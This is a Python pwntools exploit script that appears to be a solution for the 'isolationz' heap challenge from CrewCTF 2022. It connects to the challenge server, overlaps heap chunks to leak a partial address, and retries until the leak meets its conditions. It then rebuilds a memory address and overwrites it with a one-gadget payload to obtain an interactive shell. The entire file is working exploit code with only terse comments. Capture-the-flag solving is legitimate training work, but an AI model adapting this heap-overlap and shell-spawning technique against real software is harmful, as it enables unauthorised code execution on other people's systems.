from pwn import *

sla = lambda a, b, io: io.sendlineafter(a, b)

def add(size, expr):
    sla(">> ", "1", io)
    sla("Enter size: ", str(size), io)
    sla("Enter expression: ", expr, io)

def free(idx):
    sla(">> ", "2", io)
    sla("Enter index: ", str(idx), io)

def view():
    sla(">> ", "3", io)
    

def edit(idx, expr):
    sla(">> ", "4", io)
    sla("Enter index: ", str(idx), io)
    sla("Enter Expression: ", expr, io)

while True:
    i = 0
    size = 0x21d000-0xe0
    # We need last 3 bits as 1 to prevent crashes due to chunk merges
    while True:
        #io = process("./chall", env={"LD_PRELOAD":"./libc.so.6"})
	io = remote("isolationz.crewctf-2022.crewc.tf",1337)
        add(0x50, "1 + 2 + 3") # 0
        add(0x10, "1 + 2 + 3") # 1
        add(0x50, "1 + 2 + 3") # 2
        add(0x10, "1 + 2 + 3") # 3
        add(0x20, "1 + 2 + 3") # 4
        add(0x20, "1 + 2 + 3") # 5
        free(0)
        free(4)
        # Overlap header with '1'st chunk
        add(0x18, "1 + 2 + 3") # 0
        view()
        io.recvline()
        io.recvline()
        io.recvline()
        io.recvline()
        leak = u32(io.recv(3) + b'\x00')
        print(hex(leak))
        if(((leak&0x7) == 0x7) and leak>size):
            print("Location with last 3 bits set found after {} tries".format(i))
            break
        else:
            i+=1
            io.close()


    second = (leak & 0xfff) ^ 0x000 # Second 3 nibbles of chunk addr
    third = ((leak & 0xfff000) >> 12) ^ second # Third 3 bits of chunk addr
    print("Second 3 nibbles are " + hex(second))
    print("Third 3 nibbles are " + hex(third))
    addr = 0
    addr = addr | (second<<12) | (third<<24) | (0x7f1<<36)
    print("Leak @ "+str(hex(addr)))
    free(2)
    free(5)
    add(size, "1+2+3")
    # One gadget
    gadget = addr + 0x4000 + 0xeacf2

    payload = b"a"*0x28 + p64(gadget)
    #gdb.attach(io)
    add(0x60, payload)
    try:
        io.recvuntil(">> ")
        io.send("\n")
        io.interactive()
    except Exception as e:
        print("Restarting")
        io.close()
